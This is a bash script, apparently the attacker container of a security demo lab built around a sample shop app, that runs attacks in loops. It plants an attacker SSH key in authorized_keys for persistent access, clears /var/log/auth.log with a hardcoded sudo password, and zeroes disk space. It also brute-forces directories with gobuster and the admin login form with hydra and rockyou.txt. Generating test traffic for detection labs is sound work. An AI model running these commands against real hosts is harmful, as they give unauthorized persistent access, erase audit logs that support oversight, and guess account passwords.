#!/bin/bash

function ssh_attack()
{
# attempt to copy attacker key to discounts
scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh

# attempt to update authorized_keys to have attacker key
ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
cat /home/test/.ssh/attacker-key.pub >> /home/test/.ssh/authorized_keys
exit
EOT

# attempt to clear log file and zero out unallocated disk space
ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
echo "test" | sudo -S cp /dev/null /var/log/auth.log
echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
exit
EOT
}

if [ "${ATTACK_SSH}" = 1 ];
then
  if [[ -z "${ATTACK_SSH_INTERVAL}" ]]
    then
      # run single invocation
      ssh_attack
    else
      # run in a loop
      while true
      do
          ssh_attack
          sleep $ATTACK_SSH_INTERVAL
      done &
  fi
fi

# Add extra sleep to give frontend time to spin up (docker compose dependency is not enough)
sleep 15

if [ "${ATTACK_GOBUSTER}" = 1 ];
then
  if [[ -z "${ATTACK_GOBUSTER_INTERVAL}" ]]
    then
      ./gobuster dir -u http://${ATTACK_HOST}:${ATTACK_PORT} -w /usr/share/wordlists/rockyou.txt
    else
      while true
      do
          ./gobuster dir -u http://${ATTACK_HOST}:${ATTACK_PORT} -w /usr/share/wordlists/rockyou.txt
          sleep $ATTACK_GOBUSTER_INTERVAL
      done &
  fi
fi

if [ "${ATTACK_HYDRA}" = 1 ];
then
  if [[ -z "${ATTACK_HYDRA_INTERVAL}" ]]
    then
      hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s ${ATTACK_PORT} ${ATTACK_HOST} http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
    else
      while true
      do
          hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s ${ATTACK_PORT} ${ATTACK_HOST} http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
          sleep $ATTACK_HYDRA_INTERVAL
      done
  fi
fi

# keep container alive
sleep infinity